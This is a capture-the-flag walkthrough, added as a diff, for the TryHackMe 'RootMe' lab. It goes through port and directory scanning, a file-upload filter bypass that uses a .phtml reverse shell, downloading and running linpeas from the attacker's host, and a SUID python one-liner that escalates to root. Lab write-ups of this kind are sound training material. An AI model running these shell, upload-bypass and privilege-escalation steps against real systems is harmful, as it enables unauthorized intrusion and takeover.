@@ -1,0 +1,178 @@
+hi guys now we will get a shell and privesc on RootMe machine good read in advance
+let's get it
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+first step and basic start nmap scan
+# Nmap 7.92 scan initiated Fri Jan 14 08:23:22 2022 as: nmap -Pn -n -p- -T4 -A -oN fullscan -vv 10.10.2.229
+Increasing send delay for 10.10.2.229 from 0 to 5 due to 363 out of 907 dropped probes since last increase.
+Increasing send delay for 10.10.2.229 from 5 to 10 due to 19 out of 46 dropped probes since last increase.
+Nmap scan report for 10.10.2.229
+Host is up, received user-set (0.097s latency).
+Scanned at 2022-01-14 08:23:23 EST for 935s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
+|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: HackIT - Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=1/14%OT=22%CT=1%CU=38956%PV=Y%DS=2%DC=T%G=Y%TM=61E17CF
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Uptime guess: 42.244 days (since Fri Dec  3 02:47:56 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+and go to port 80 When we examined the source code, it did not give much clue or information.
+now we are getting help from dirsearch and we need to get some directory
+run the commands;
+
+dirsearch -u http://targetip
+
+  (_| )
+
+Extensions: php, aspx, js_|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| p, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /root/.dirsearch/reports/targetip/_22-01-14_08-23-47.txt
+
+Error Log: /root/.dirsearch/logs/errors-22-01-14_08-23-47.log
+
+Target: http://targetip/
+
+[08:23:48] Starting: 
+[08:23:52] 301 -  307B  - /js  ->  http://targetip/js/
+[08:23:57] 403 -  276B  - /.htaccess_sc
+[08:23:57] 403 -  276B  - /.htaccess.bak1
+[08:23:57] 403 -  276B  - /.htaccess.sample
+[08:23:57] 403 -  276B  - /.htaccess_extra
+[08:23:57] 403 -  276B  - /.htaccess.save
+[08:23:57] 403 -  276B  - /.htpasswd_test
+[08:23:57] 403 -  276B  - /.htpasswds
+[08:23:57] 403 -  276B  - /.httr-oauth
+[08:23:58] 403 -  276B  - /.htm
+[08:23:58] 403 -  276B  - /.html
+[08:23:58] 403 -  276B  - /.htaccessBAK
+[08:23:58] 403 -  276B  - /.htaccess.orig
+[08:23:58] 403 -  276B  - /.htaccessOLD
+[08:23:58] 403 -  276B  - /.htaccess_orig
+[08:23:58] 403 -  276B  - /.ht_wsr.txt
+[08:23:58] 403 -  276B  - /.htaccessOLD2
+[08:24:01] 403 -  276B  - /.php
+[08:24:52] 301 -  308B  - /css  ->  http://targetip/css/
+[08:25:09] 200 -  616B  - /index.php
+[08:25:09] 200 -  616B  - /index.php/login/
+[08:25:12] 200 -  957B  - /js/
+********************************[08:25:25] 301 -  310B  - /p***l  ->  http://targetip/p***l/***************************************************
+[08:25:26] 200 -  732B  - /p***l/
+[08:25:41] 403 -  276B  - /server-status
+[08:25:41] 403 -  276B  - /server-status/
+********************************[08:25:56] 301 -  312B  - /uploads  ->  http://targetip/uploads/*****************************************************
+[08:25:56] 200 -  742B  - /uploads/
+
+Task Completed
+
+there we go 
+
+nice, found directory : p***l
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+go to this url  http://targetip/p***l/ 
+I stumbled upon the file upload part I tried to upload a normal jpg file and it was successful, then with the help of pentest monkey I uploaded a file from which I could get a shell with the extension php-reverse-shell-php. It gave a similar warning that I am not authorized by the system to upload a file with a php extension (I don't have spanish, sorry)
+
+I tried 3 extensions as .php3 .php5 .phtml one by one.
+Every time I tried, I listened to the port I wrote in php-reverse-shell with netcat. I couldn't get a reverse shell in .php3 In .php5 it didn't give a revese shell again, but when I tried with .phtml I got a reverse shell and we made our first entry into the machine.
+Let's secure our shell with python3
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+and now let's write this commands
+www-data@rootme:/$ id   
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@rootme:/$ pwd
+pwd
+/
+www-data@rootme:/$ whoami
+whoami
+www-data
+www-data@rootme:/$ 
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+after some browsing  '/var/www/user.txt' I saw that there is user.txt in it.
+cat /var/www/user.txt;
+  THM{y**_g**_*_s***l}
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+go to tmp file
+www-data@rootme:/$ cd /tmp
+
+on own kali machine
+python3 -m http.server 80
+www-data@rootme:/$ cd /tmp  and this command enter
+www-data@rootme:/tmp$ wget http://tun0/linpeas.sh
+www-data@rootme:/tmp$ chmod 777 linpeas.sh
+www-data@rootme:/tmp$ ./linpeas.sh
+
+Interesting Files 
+ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strings Not Found
+-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
+******************************-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/p****n(%95 vulnerable SUİD privesc)*****************************************************
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
+
+This might be the place to try privesc with 95% vulnerable SUID privileges : -rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/p****n
+go to gtfobins website and search p****n suid
+
+www-data@rootme:/tmp$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+and let's go root flag
+
+THM{p*******3_3*********n}
+
+That's it for today. Happy hack day guys...
+see you next time
+
+
+
+
+
+
+
+
+
+
